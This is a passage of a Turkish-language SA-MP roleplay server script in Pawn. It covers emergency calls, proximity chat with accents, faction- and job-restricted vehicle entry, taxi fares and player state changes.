						SendClientMessage(playerid, COLOR_DBLUE, "Polis Merkezi: Dalga geçmeyi býrakýn, burasý acil bir hattýr. Bunun için hapse atýlabilirsiniz.");
						SendClientMessage(playerid, COLOR_GRAD2, "   Karsidaki kiþi telefonu kapattý...");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 0;
					}
					SendClientMessage(playerid, COLOR_DBLUE, "Polis Merkezi: Bu alandaki tüm birimlere bildirdik.");
					SendClientMessage(playerid, COLOR_DBLUE, "Bu suçu ihbar ettiðiniz için teþekkür ederiz.");
					new
						szZone[MAX_ZONE_NAME];

					GetPlayer2DZone(playerid, szZone, MAX_ZONE_NAME);
					format(string, sizeof(string), "Merkez: Tüm Birimlerin Dikkatine: Ýhbar eden: %s (%s)",GetPlayerNameEx(playerid), szZone);
					SendFamilyMessage(1, COLOR_DBLUE, string);
					SendFamilyMessage(2, COLOR_DBLUE, string);
					format(string, sizeof(string), "Merkez: Suç: %s, Zanlý: %s",PlayerCrime[playerid][pAccusing], GetPlayerNameEx(badguy));
					SendFamilyMessage(1, COLOR_DBLUE, string);
					SendFamilyMessage(2, COLOR_DBLUE, string);
					CalledCops[playerid] = 1;
					CopsCallTime[playerid] = 60;
					ShowPlayerBeaconForCops(playerid);
					SendClientMessage(playerid, COLOR_GRAD2, "   Karsidaki kiþi telefonu kapattý...");
					Mobile[playerid] = INVALID_PLAYER_ID;

					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
					RemovePlayerAttachedObject(playerid, 9);
					return 0;
				}
				return 0;
			}
			else
			{
				format(string, sizeof(string), "Polis Merkezi: %s ismi hakkýnda hiçbir bilgi yok, bu ismin doðru olduðuna emin misiniz?",text);
				SendClientMessage(playerid, COLOR_DBLUE, string);
				return 0;
			}
		}
		if(Mobile[playerid] == 912)
		{
			if(!text[0])
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "ACÝL: Üzgünüm, anlayamadým?");
				return 0;
			}
			strmid(PlayerCrime[playerid][pAccusing], text, 0, strlen(text), 255);
			SendClientMessage(playerid, COLOR_DBLUE, "Polis Merkezi: Eðer saldýrganýn adýný biliyorsanýz söyleyin, bilmiyorsanýz hayir diyin.");
			Mobile[playerid] = 913;
			return 0;
		}
		if(Mobile[playerid] == 911)
		{
			if(!text[0])
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "ACÝL: Afedersiniz, anlayamadým - polis mi hastane mi?");
				return 0;
			}
			else if(strcmp("polis", text, true) == 0)
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "ACÝL: Sizi polis merkezine baðlýyorum, lütfen bekleyin...");
				Mobile[playerid] = 912;
				SendClientMessage(playerid, COLOR_DBLUE, "Polis Merkezi: Lütfen olay/iþlenen suç hakkýnda kýsa bilgi verin.");
				return 0;
			}
			else if(strcmp("hastane", text, true) == 0)
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "ACÝL: Sizi LSFMD merkezine baðlýyorum, lütfen bekleyin...");
				Mobile[playerid] = 914;
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Merkez: Lütfen olay hakkýnda kýsaca bilgi verin.");
				return 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "ACÝL: Afedersiniz, anlayamadým - polis mi hastane mi?");
				return 0;
			}
		}
		if(IsPlayerConnected(Mobile[playerid]))
		{
			if(Mobile[Mobile[playerid]] == playerid)
			{
				if(SpeakerPhone[playerid] != 0)
				{
				    format(string, sizeof(string), "(hoparlör) %s söyler: %s", GetPlayerNameEx(playerid), text);
					ProxDetector(20.0, Mobile[playerid], string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
				}
				else
				{
				    SendClientMessage(Mobile[playerid], COLOR_YELLOW, string);
				}
				if(PlayerInfo[playerid][pBugged] == 1)
				{
					format(string, sizeof(string), "(bocek) %s (ceptelefonu): %s", GetPlayerNameEx(playerid), text);
					SendBugMessage(2, COLOR_LIGHTGREEN, string);
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Karþý tarafta kimse yok!");
			CellTime[playerid] = 0;
			SendClientMessage(playerid,  COLOR_GRAD2, "   Telefonu kapattýn.");
			format(string, sizeof(string), "* %s telefonu kaldýrdý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			Mobile[playerid] = INVALID_PLAYER_ID;
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
			RemovePlayerAttachedObject(playerid, 9);
		}
		return 0;
	}

	sendername = GetPlayerNameEx(playerid);

	switch(PlayerInfo[playerid][pAccent])
	{
		case 0, 1: format(string, sizeof(string), "%s söyler: %s", sendername, text);
		case 2: format(string, sizeof(string), "(Ýngiliz aksaný) %s söyler: %s", sendername, text);
		case 3: format(string, sizeof(string), "(Asyalý aksaný) %s söyler: %s", sendername, text);
		case 4: format(string, sizeof(string), "(Ýskoç aksaný) %s söyler: %s", sendername, text);
		case 5: format(string, sizeof(string), "(Ýrlandalý aksaný) %s söyler: %s", sendername, text);
		case 6: format(string, sizeof(string), "(Rusyalý aksaný) %s söyler: %s", sendername, text);
		case 7: format(string, sizeof(string), "(Amerikalý aksaný) %s söyler: %s", sendername, text);
		case 8: format(string, sizeof(string), "(Ýspanyol aksaný) %s söyler: %s", sendername, text);
		case 9: format(string, sizeof(string), "(Güneyli aksaný) %s söyler: %s", sendername, text);
		case 10: format(string, sizeof(string), "(Kübalý aksaný) %s söyler: %s", sendername, text);
		case 11: format(string, sizeof(string), "(Ýtalyalý aksaný) %s söyler: %s", sendername, text);
		case 12: format(string, sizeof(string), "(Gangster aksaný) %s söyler: %s", sendername, text);
		case 13: format(string, sizeof(string), "(Avusturalyalý aksaný) %s söyler: %s", sendername, text);
		case 14: format(string, sizeof(string), "(Arap aksaný) %s söyler: %s", sendername, text);
		case 15: format(string, sizeof(string), "(Balkan aksaný) %s söyler: %s", sendername, text);
		case 16: format(string, sizeof(string), "(Kanadalý aksaný) %s söyler: %s", sendername, text);
		case 17: format(string, sizeof(string), "(Jamaikalý aksaný) %s söyler: %s", sendername, text);
		case 18: format(string, sizeof(string), "(Ýsrailli aksaný) %s söyler: %s", sendername, text);
		case 19: format(string, sizeof(string), "(Hint aksaný) %s söyler: %s", sendername, text);
		case 20: format(string, sizeof(string), "(Welsh accent) %s söyler: %s", sendername, text);
		case 21: format(string, sizeof(string), "(Fransýz aksaný) %s söyler: %s", sendername, text);
		case 22:format(string, sizeof(string), "(Alman aksaný) %s söyler: %s", sendername, text);
		case 23: format(string, sizeof(string), "(Hollandalý aksaný) %s söyler: %s", sendername, text);
		case 24: format(string, sizeof(string), "(Güney Afrikalý aksaný) %s söyler: %s", sendername, text);
		case 25: format(string, sizeof(string), "%s söyler: %s", sendername, text);
	}
	if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAccent] != 25) {
		format(string, sizeof(string), "%s söyler: (( %s )) ", sendername, text);
		ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		SetPlayerChatBubble(playerid, text, COLOR_WHITE, 20.0, 5000);
	} else {
		if(IsPlayerInAnyVehicle(playerid) && IsVehicleWindowsDown[vehicleid] == 1) { //Windows closed.
			format(string, sizeof(string), "[Cam Kapalý] %s söyler: %s", sendername, text);
			ProxDetector(3.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		} else {
			ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			SetPlayerChatBubble(playerid,text,COLOR_WHITE,20.0,5000);
		}
		if(PlayerInfo[playerid][pBugged] == 1 && AdminDuty[playerid] == 0) {
			format(string, sizeof(string), "(bocek) %s: %s", GetPlayerNameEx(playerid), text);
			SendBugMessage(2, COLOR_LIGHTGREEN, string);
		}
	}
	return 0;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger) {
	if(PlayerCuffed[playerid] != 0)
		SetPVarInt(playerid, "ToBeEjected", 1);

	if(GetPVarInt(playerid, "Injured") == 1)
		SetPVarInt(playerid, "ToBeEjected", 1);

	SetPVarInt(playerid, "LastWeapon", GetPlayerWeapon(playerid));

	GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
	if(engine == VEHICLE_PARAMS_UNSET) switch(GetVehicleModel(vehicleid)) {
		case 509, 481, 510: Fuel[vehicleid] = 100, arr_Engine{vehicleid} = 1, SetVehicleParamsEx(vehicleid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
		default: SetVehicleParamsEx(vehicleid,VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective), arr_Engine{vehicleid} = 0;
	}

    if(GetPVarInt(playerid, "Pizza") != 0 && !(IsAPizzaCar(vehicleid))) {
	    new Float:slx, Float:sly, Float:slz;
		GetPlayerPos(playerid, slx, sly, slz);
		SetPlayerPos(playerid, slx, sly, slz+1.3);
		PlayerPlaySound(playerid, 1130, slx, sly, slz+1.3);
		RemovePlayerFromVehicle(playerid);
		NOPCheck(playerid);
		SendClientMessage(playerid, COLOR_GRAD2, "Pizza teslimatý yapmak için pizzacý motorunda olman gerek.");
		return 1;
	}

	if(!ispassenger)
	{
	    SetPlayerArmedWeapon(playerid, 0);

   		if(GetChased[playerid] < 999 && VehicleBomb{vehicleid} == 1)
		{
			if(PlayerInfo[playerid][pHeadValue] >= 1)
			{
				if(PlayerInfo[GetChased[playerid]][pFaction] == 4 || PlayerInfo[GetChased[playerid]][pLeader] == 4)
				{
   					VehicleBomb{vehicleid} = 0;
				    SetTimerEx("VehicleBombDelay", 5000, 0, "d", playerid);
					return 1;
				}
			}
		}

   		if(IsACopCar(vehicleid)) {
		    if(PlayerInfo[playerid][pFaction] != 1 && PlayerInfo[playerid][pLeader] != 1) {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "LSPD'den deðilsin!");
			}
		}
		else if(IsAFBICar(vehicleid)) {
		    if(PlayerInfo[playerid][pFaction] != 2 && PlayerInfo[playerid][pLeader] != 2) {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "FBI'dan deðilsin.");
			}
		}
	    else if(IsAPizzaCar(vehicleid)) {
		    if(PlayerInfo[playerid][pJob] != 21 && PlayerInfo[playerid][pJob2] != 21) {
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.3);
				PlayerPlaySound(playerid, 1130, slx, sly, slz+1.3);
			    RemovePlayerFromVehicle(playerid);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "Pizzacý deðilsin!");
			}
		}
		else if(IsAVipCar(vehicleid)) {
		    if(PlayerInfo[playerid][pDonator] < 2) {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "Bu araca binebilmek için en az Safir VIP olmalýsýn!");
			}
		}
		else if(IsAnAmbulance(vehicleid)) {
		    if(PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3) {
			    if(LSFMDVehicles[13] == vehicleid && PlayerInfo[playerid][pRank] < 5) {
			        RemovePlayerFromVehicle(playerid);
			        new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz);
			        NOPCheck(playerid);
					SendClientMessage(playerid, COLOR_GRAD2, "Bu aracý sadece R5 ve üzeri kullanabilir.");
			    }
			}
		    else
			{
			    SendClientMessage(playerid,COLOR_GREY,"   LSFMD'den deðilsin!");
				RemovePlayerFromVehicle(playerid);
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
				NOPCheck(playerid);
			}
		}
		else if(IsANewsVeh(vehicleid)) {
		    if(PlayerInfo[playerid][pFaction] != 9 && PlayerInfo[playerid][pLeader] != 9) {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "San Andreas Haberleri oluþumunda deðilsin!");
			} else if(GetVehicleModel(vehicleid) == 488 && PlayerInfo[playerid][pRank] < 3) {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "Bu helikopteri uçurabilmek için en az R3 olman gerek.");
			}
		}
		else if(IsAGovCar(vehicleid)) {
		    if(PlayerInfo[playerid][pFaction] != 5 && PlayerInfo[playerid][pLeader] != 5) {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "SAD'dan deðilsin.");
			}
		}
 		else if(IsAPlane(vehicleid)) {
	  		if(PlayerInfo[playerid][pFlyLic] != 1) {
		  		RemovePlayerFromVehicle(playerid);
		  		new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
		  		NOPCheck(playerid);
			 	SendClientMessage(playerid,COLOR_GREY,"Pilot belgen yok!");
	  		}
		}
		else if(IsAHelicopter(vehicleid)) {
		    if(LSFMDVehicles[38] == vehicleid || LSFMDVehicles[39] == vehicleid || LSFMDVehicles[40] == vehicleid) {
		    	if(PlayerInfo[playerid][pFaction] != 3 || PlayerInfo[playerid][pDivision] != 2) {
					RemovePlayerFromVehicle(playerid);
					new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz);
				  	NOPCheck(playerid);
					SendClientMessage(playerid,COLOR_GREY,"Bu araç hayat uçuþu birimine aittir.");
				}
			}

		    PlayerInfo[playerid][pAGuns][GetWeaponSlot(46)] = 46;
			GivePlayerValidWeapon(playerid, 46, 60000);
		}
		else if(IsATruckerCar(vehicleid)) {
		    if(PlayerInfo[playerid][pJob] == 20 || PlayerInfo[playerid][pJob2] == 20) {
				new string[128];

				new truckcontents = TruckContents[vehicleid];
				new truckcontentname[50];
				if(truckcontents == 0)
				{ format(truckcontentname, sizeof(truckcontentname), "Yok"); }
				else if(truckcontents >= 1 && truckcontents <= 3)
				{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Yiyecek & Ýçecek");}
				else if(truckcontents >= 4 && truckcontents <= 6)
				{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Kýyafet"); }
				else if(truckcontents == 7)
				{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Legal materyaller"); }
				else if(truckcontents >= 8 && truckcontents <= 10)
				{ format(truckcontentname, sizeof(truckcontentname), "{00F70C}Market malzemeleri"); }
				else if(truckcontents >= 11 && truckcontents <= 15)
				{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}Illegal silahlar"); }
				else if(truckcontents >= 16 && truckcontents <= 20)
				{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}Uyuþturucular"); }
				else if(truckcontents >= 21 && truckcontents <= 25)
				{ format(truckcontentname, sizeof(truckcontentname), "{FF0606}Illegal materyaller"); }

				format(string, sizeof(string), "KAMYONCU MESLEÐÝ: (Araç Kaydý: %s %d) - (Ýçerik: %s{FFFF00})", GetVehicleName(vehicleid), vehicleid, truckcontentname);
				SendClientMessage(playerid, COLOR_YELLOW, string);

				if(IsACop(playerid) && truckcontents >= 11)
				{
					SendClientMessage(playerid, COLOR_YELLOW, "KAMYONCU MESLEÐÝ: Kamyondaki illegal eþyalarý temizlemek için, kamyonun yakýnýndayken /yuktemizle.");
				}
				if(truckcontents > 0 && TruckUsed[playerid] == INVALID_VEHICLE_ID)
				{
					SendClientMessage(playerid, COLOR_YELLOW, "KAMYONCU MESLEÐÝ: Çaldýðýnýz kamyondaki mallarý teslim etmek için sürücüyken /yukcal.");
				}
				else if(TruckUsed[playerid] == INVALID_VEHICLE_ID)
				{
    				SendClientMessage(playerid, COLOR_YELLOW, "KAMYONCU MESLEÐÝ: Kamyona yük yüklemek için, sürücüyken /yukyukle yaz.");
				}
				else if(TruckUsed[playerid] == vehicleid && gPlayerCheckpointStatus[playerid] == CHECKPOINT_RETURNTRUCK)
				{
					SendClientMessage(playerid, COLOR_YELLOW, "KAMYONCU MESLEÐÝ: Bu senin kamyonun, paraný almak için Ocean Dock'a geri götürmedin.");
				}
				else if(TruckUsed[playerid] == vehicleid)
   				{
      				SendClientMessage(playerid, COLOR_YELLOW, "KAMYONCU MESLEÐÝ: Bu senin kamyonun, içerisindeki eþyalarý hala teslim etmedin.");
     			}
				else if(TruckUsed[playerid] != INVALID_VEHICLE_ID)
   				{
      				SendClientMessage(playerid, COLOR_YELLOW, "KAMYONCU MESLEÐÝ: Zaten bir teslimat görevin var, iptal etmek için /iptal kamyoncu yaz.");
     			}
			}
		    else
			{
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "Kamyoncu deðilsin!");
			}
		}
		else if(IsAnTaxi(vehicleid) || IsAnBus(vehicleid)) {
	        if(PlayerInfo[playerid][pFaction] != 6) {
		        SendClientMessage(playerid,COLOR_GREY,"Los Santos Taxi oluþumunda deðilsin!");
		        RemovePlayerFromVehicle(playerid);
		        new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
		    }
		}
	}
	else if(!IsPlayerInRangeOfVehicle(playerid, vehicleid, 7.5) || LockStatus[vehicleid] >= 1) { // G-bugging fix
		ClearAnimations(playerid, 1);
	}
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid) {
	if(GetPlayerState(playerid) == 1)
		return 1;

    HideProgressBarForPlayer(playerid, FuelBar[playerid]);
	SetPVarInt(playerid, "fuelonoff", 0);
	DestroyProgressBar(FuelBar[playerid]);
	FuelBar[playerid] = INVALID_BAR_ID;
	if(GetPVarInt(playerid, "rccam") == 1)
	{
		DestroyVehicle(GetPVarInt(playerid, "rcveh"));
		VehicleRadioStation[GetPVarInt(playerid, "rcveh")] = 0;
	    SetPlayerPos(playerid, GetPVarFloat(playerid, "rcX"), GetPVarFloat(playerid, "rcY"), GetPVarFloat(playerid, "rcZ"));
		DeletePVar(playerid, "rccam");
	    KillTimer(GetPVarInt(playerid, "rccamtimer"));
	}
	return 1;
}
public OnPlayerStreamIn(playerid, forplayerid)
{
    if (PlayerInfo[playerid][pPetKontrol])
		ShowPlayerNameTagForPlayer(forplayerid, playerid, 0);
	else
	    ShowPlayerNameTagForPlayer(forplayerid, playerid, 1);

	return 1;
}
public RandomMessage()
{
	TextDrawSetString(bilgilen, RandomMessages[random(sizeof(RandomMessages))]);
 	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate) {
	if(GettingSpectated[playerid] != 999)
	{
	    new spectator = GettingSpectated[playerid];
	    if(!IsPlayerConnected(spectator))
	    {
	        GettingSpectated[playerid] = 999;
	        Spectate[spectator] = 999;
		}

	    if(newstate == PLAYER_STATE_DRIVER && PlayerInfo[spectator][pAdmin] >= 2 || newstate == PLAYER_STATE_PASSENGER && PlayerInfo[spectator][pAdmin] >= 2)
	    {
	        TogglePlayerSpectating(spectator, true);
			new carid = GetPlayerVehicleID(playerid);
			PlayerSpectateVehicle(spectator, carid);
	    }
	    else if(newstate == PLAYER_STATE_ONFOOT && PlayerInfo[spectator][pAdmin] >= 2)
	    {
	        TogglePlayerSpectating(spectator, true);
		   	PlayerSpectatePlayer(spectator, playerid);
		   	SetPlayerInterior(spectator, GetPlayerInterior(playerid));
	    }
	}

	if((newstate == 2 || newstate == 3 || newstate == 7 || newstate == 9) && pTazer[playerid] == 1)
	{
	    RemovePlayerWeapon(playerid, 23);
		GivePlayerValidWeapon(playerid, pTazerReplace[playerid], 60000);
		pTazer[playerid] = 0;
	}
    if(oldstate == PLAYER_STATE_DRIVER || oldstate == PLAYER_STATE_PASSENGER)
    {
		if(GetPVarInt(playerid, "fuelonoff") == 1)
		{
		    HideProgressBarForPlayer(playerid, FuelBar[playerid]);
			SetPVarInt(playerid, "fuelonoff", 0);
			DestroyProgressBar(FuelBar[playerid]);
			FuelBar[playerid] = INVALID_BAR_ID;
		}
    }
	if(newstate == PLAYER_STATE_ONFOOT)
	{
		if(MP3Station[playerid] == 0) {
			StopAudioStreamForPlayer(playerid);
		} else {
			new
				t = MP3Station[playerid]-1;
  			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[t][radiourl]);
		}

		if(GettingSpectated[playerid] < MAX_PLAYERS && PlayerInfo[GettingSpectated[playerid]][pAdmin] >= 2)
		{
			new spectator = GettingSpectated[playerid];
  			// Preventing possible buffer overflows with the arrays
			TogglePlayerSpectating(spectator, true);
			PlayerSpectatePlayer(spectator, playerid);
			SetPlayerInterior(spectator, GetPlayerInterior(playerid));
			SetPlayerInterior(spectator, GetPlayerInterior(playerid));
			SetPlayerVirtualWorld(spectator, GetPlayerVirtualWorld(playerid));
		}
		if(ConnectedToPC[playerid] == 1337)//mvb
	    {
            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB'den çýkýþ yaptýn.");
	        ConnectedToPC[playerid] = 0;
		}
		if(RadarActive[playerid] == 1)//mvb speed radar
	    {
            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* MVB Hýz radarýný kapattýn.");
			RadarActive[playerid] = 0;
			TextDrawDestroy(RadarTitle[playerid]);
			TextDrawDestroy(RadarContext[playerid]);
		}
        if(TransportDuty[playerid] > 0)
		{
		    if(TransportDuty[playerid] == 1)
			{
		        TaxiDrivers -= 1;
			}
			else if(TransportDuty[playerid] == 2)
			{
			    BusDrivers -= 1;
			}
			TransportDuty[playerid] = 0;
			new string[42];
			format(string, sizeof(string), "* Ýþbaþýndan çýktýn ve $%d kazandýn.", TransportMoney[playerid]);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, TransportMoney[playerid]);
			ConsumingMoney[playerid] = 1; TransportValue[playerid] = 0; TransportMoney[playerid] = 0;
			SetPlayerColor(playerid, TEAM_HIT_COLOR);
			TransportTime[playerid] = 0;
   			TransportCost[playerid] = 0;
		}
		if(TransportDriver[playerid] < MAX_PLAYERS && AdminDuty[playerid] == 0)
		{
			new string[128];
			TransportMoney[TransportDriver[playerid]] += TransportCost[playerid];
			//format(string, sizeof(string), "Taksi ucreti: $%d",TransportCost[playerid]);
			//SendClientMessage(playerid, COLOR_WHITE, string);
			//format(string, sizeof(string), "~Musteri taksiden ayrildi kazanilan: $%d",TransportCost[playerid]);
			//SendClientMessage(TransportDriver[playerid], COLOR_WHITE, string);
			GivePlayerCash(playerid, -TransportCost[playerid]);

			new ip[32], ipex[32];
			GetPlayerIp(playerid, ip, sizeof(ip));
			GetPlayerIp(TransportDriver[playerid], ipex, sizeof(ipex));
			TaxiWarn[playerid][TransportDriver[playerid]] += TransportCost[playerid];
			if(TaxiWarn[playerid][TransportDriver[playerid]] >= 10000)
			{
				format(string, sizeof(string), "%s (IP:%s), %s (IP:%s)'ý istediði yere götürdü ve $%d kazandý.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(TransportDriver[playerid]), ipex, TaxiWarn[playerid][TransportDriver[playerid]]);
				//Log("logs/pay.log", string);
				ABroadCast(COLOR_YELLOW, string, 1);
			}
			TransportTime[TransportDriver[playerid]] = 0;
			TransportCost[TransportDriver[playerid]] = 0;
			TransportCost[playerid] = 0;
			TransportTime[playerid] = 0;
			TransportDriver[playerid] = 999;
		}
		TelePos[playerid][0] = 0.0;
		TelePos[playerid][1] = 0.0;
	}
	if(newstate == PLAYER_STATE_WASTED)
	{
	    if(GetPVarInt(playerid, "EventToken") == 0 && AdminDuty[playerid] == 0)
	    {
			SetPVarInt(playerid, "DoktorMasrafi", 1);
		}
	}
 	if(newstate == PLAYER_STATE_PASSENGER)
	{
	    fVehSpeed[playerid] = 0;
	    new vehicleid = GetPlayerVehicleID(playerid);
	    gLastCar[playerid] = vehicleid;

 		if(PlayerInfo[playerid][pGuns][4] > 0)	SetPlayerArmedWeapon(playerid,PlayerInfo[playerid][pGuns][4]);
		else SetPlayerArmedWeapon(playerid,0);

  		if(GetPVarInt(playerid, "ToBeEjected") >= 1)
    	{
	       	SetPVarInt(playerid, "ToBeEjected", 0);
	       	RemovePlayerFromVehicle(playerid);
	       	new Float:X, Float:Y, Float:Z;
			GetPlayerPos(playerid, X, Y, Z);
			SetPlayerPos(playerid, X, Y, Z+2);

			if(GetPVarInt(playerid, "Injured") == 1)
  			{
  			    Streamer_UpdateEx(playerid, GetPVarFloat(playerid,"MedicX"), GetPVarFloat(playerid,"MedicY"), GetPVarFloat(playerid,"MedicZ"));
		   		SetPlayerPos(playerid, GetPVarFloat(playerid,"MedicX"), GetPVarFloat(playerid,"MedicY"), GetPVarFloat(playerid,"MedicZ"));
				SetPlayerVirtualWorld(playerid, GetPVarInt(playerid,"MedicVW"));
				SetPlayerInterior(playerid, GetPVarInt(playerid,"MedicInt"));
   				ClearAnimations(playerid, 1);
				ApplyAnimation(playerid, "KNIFE", "KILL_Knife_Ped_Die", 4.0, 0, 1, 1, 1, 0, 1);
   			}
   		}

		if(VehicleRadioStation[GetPlayerVehicleID(playerid)] != 0)
		{
			new getradio = VehicleRadioStation[GetPlayerVehicleID(playerid)]-1;
			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[getradio][radiourl]);
		}

  		foreach(Player, i)
	    {
     		if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) == 2 && TransportDuty[i] > 0 && AdminDuty[playerid] == 0)
       		{
				if(GetPlayerCash(playerid) < TransportValue[i])
				{
					new string[128];
					format(string, sizeof(string), "Binebilmek için $%d'a ihtiyacýn var.", TransportValue[i]);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					RemovePlayerFromVehicle(playerid);
					new Float:X, Float:Y, Float:Z;
					GetPlayerPos(playerid, X, Y, Z);
					SetPlayerPos(playerid, X, Y, Z+2);
					TogglePlayerControllable(playerid, 1);
				}
				else
				{
					new string[128];
					if(TransportDuty[i] == 1 && AdminDuty[playerid] == 0)
					{
						format(string, sizeof(string), "* Taksi þoförüne $%d para ödedin.", TransportValue[i]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* %s adlý müþteri taksi aracýnýza bindi.", GetPlayerNameEx(playerid));
						SendClientMessage(i, COLOR_LIGHTBLUE, string);
						TransportTime[i] = 1;
						TransportTime[playerid] = 1;
						TransportCost[playerid] = TransportValue[i];
						TransportCost[i] = TransportValue[i];
						TransportDriver[playerid] = i;
					}
					else if(TransportDuty[i] == 2)
					{
						format(string, sizeof(string), "* Taksi þoförüne $%d para ödedin.", TransportValue[i]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* %s adlý müþteri taksi aracýnýza bindi.", GetPlayerNameEx(playerid));
						SendClientMessage(i, COLOR_LIGHTBLUE, string);
					}
					GivePlayerCash(playerid, - TransportValue[i]);
					TransportMoney[i] += TransportValue[i];
				}
      		}
	    }
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{
	    fVehSpeed[playerid] = 0;

	    SetPlayerArmedWeapon(playerid, 0);

	    if(VehicleRadioStation[GetPlayerVehicleID(playerid)] == 0)
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "{00ECFF}Vehicle radio station:{FFFFFF} Yok - {00ECFF}Tür:{FFFFFF} Yok {00ECFF} (/radyoac)");
	        SendClientMessage(playerid, COLOR_WHITE, "{FFFFFF}Emniyet kemerinizi mutlaka takýn ! {00ECFF} (/emniyetkemeri)");
		}
   		if(VehicleRadioStation[GetPlayerVehicleID(playerid)] != 0)
		{
			new getradio = VehicleRadioStation[GetPlayerVehicleID(playerid)]-1;
			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[getradio][radiourl]);

			new genre[18];
			if(getradio >= 0 && getradio <= 9) genre = "Alternatif";
			else if(getradio >= 10 && getradio <= 19) genre = "Hüzün";
			else if(getradio >= 20 && getradio <= 29) genre = "Klasik";
			else if(getradio >= 30 && getradio <= 39) genre = "Þehir";
			else if(getradio >= 40 && getradio <= 49) genre = "Yýllar";
			else if(getradio >= 50 && getradio <= 59) genre = "Dinlemesi kolay";
			else if(getradio >= 60 && getradio <= 69) genre = "Elektronik";
